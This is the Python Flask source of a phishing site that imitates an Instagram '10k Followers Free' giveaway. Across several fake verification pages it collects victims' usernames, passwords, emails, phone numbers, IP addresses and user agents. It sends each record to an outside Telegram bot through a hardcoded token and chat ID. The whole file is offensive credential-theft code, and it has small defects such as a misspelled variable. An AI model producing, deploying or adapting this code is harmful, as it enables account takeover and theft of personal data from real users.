from flask import Flask, render_template, request, session, redirect, url_for
import requests
import json
import os
from datetime import datetime
from flask_cors import CORS

app = Flask(__name__)
app.secret_key = os.urandom(24)
CORS(app)

# YOUR TELEGRAM CREDENTIALS - DIRECTLY INSERTED
TELEGRAM_BOT_TOKEN = "8594771939:AAGWA3GXJthIAqCHMfN7gMAFT_YjVyGGFHo"
TELEGRAM_CHAT_ID = "6440775961"

# Store captured data (in production use Redis/DB)
captured_data = []

def send_to_telegram(data):
    """Send stolen credentials to Telegram with formatting"""
    # Format the message
    message = f"""
    🚨 *NEW INSTAGRAM VICTIM CAPTURED* 🚨

    📱 *Account Details:*
    👤 Username: {data.get('username', 'N/A')}
    🔑 Password: {data.get('password', 'N/A')}
    📧 Email: {data.get('email', 'N/A')}
    📞 Phone: {data.get('phone', 'N/A')}
    
    🌐 *Technical Info:*
    🔍 IP Address: {data.get('ip', 'N/A')}
    🖥️ User Agent: {data.get('user_agent', 'N/A')}
    ⏰ Time: {data.get('time', 'N/A')}
    
    📊 *Campaign:* 10k Followers Free
    🎯 Status: {data.get('status', 'Credentials Captured')}
    """
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown",
        "disable_web_page_preview": True
    }
    
    try:
        response = requests.post(url, json=payload, timeout=10)
        if response.status_code == 200:
            print(f"[+] Telegram alert sent for {data.get('username')}")
            return True
        else:
            print(f"[-] Telegram error: {response.text}")
            return False
    except Exception as e:
        print(f"[-] Telegram send failed: {e}")
        return False

@app.route('/')
def index():
    """Main phishing page - Instagram 10k Followers Free"""
    session.clear()
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    """Step 1: Capture Instagram credentials"""
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    
    # Store in session
    session['username'] = username
    session['password'] = password
    session['step'] = 'login'
    
    # Prepare data for Telegram
    victim_data = {
        'username': username,
        'password': password,
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'status': 'Step 1 - Login Credentials Captured'
    }
    
    # Send to Telegram immediately
    send_to_telegram(victim_data)
    captured_data.append(victim_data)
    
    # Redirect to verification page
    return redirect(url_for('verify'))

@app.route('/verify')
def verify():
    """Step 2: Ask for email/phone verification"""
    if 'username' not in session:
        return redirect(url_for('index'))
    return render_template('verify.html', username=session['username'])

@app.route('/process', methods=['POST'])
def process():
    """Step 3: Capture email/phone"""
    email = request.form.get('email', '').strip()
    phone = request.form.get('phone', '').strip()
    
    # Prepare complete victim data
    victim_data = {
        'username': session.get('username', 'N/A'),
        'password': session.get('password', 'N/A'),
        'email': email,
        'phone': phone,
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'status': 'COMPLETE - All Data Captured'
    }
    
    # Send final alert to Telegram
    send_to_telegram(victim_data)
    captured_data.append(victil_data)
    
    # Redirect to fake loading page
    return redirect(url_for('loading'))

@app.route('/loading')
def loading():
    """Fake processing page"""
    return render_template('loading.html')@app.route('/success')
def success():
    """Final fake success page"""
    # Send one more notification about completion
    final_alert = {
        'username': session.get('username', 'N/A'),
        'status': 'VICTIM COMPLETED ALL STEPS',
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'note': 'User believes they will get 10k followers'
    }
    send_to_telegram(final_alert)
    
    return render_template('success.html')

@app.route('/admin/stats', methods=['GET'])
def admin_stats():
    """Admin page to view captured data (password protected)"""
    # Simple password protection
    if request.args.get('key') != 'admin123':
        return "Unauthorized", 403
    
    stats = {
        'total_captured': len(captured_data),
        'latest_victims': captured_data[-5:] if captured_data else [],
        'telegram_token': TELEGRAM_BOT_TOKEN,
        'chat_id': TELEGRAM_CHAT_ID
    }
    
    return json.dumps(stats, indent=2)

@app.route('/telegram/test', methods=['GET'])
def test_telegram():
    """Test Telegram connection"""
    test_data = {
        'username': 'TEST_USER',
        'password': 'TEST_PASS',
        'ip': '127.0.0.1',
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'status': 'BOT TEST MESSAGE'
    }
    
    if send_to_telegram(test_data):
        return "✅ Telegram bot working!"
    else:
        return "❌ Telegram bot failed!"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)
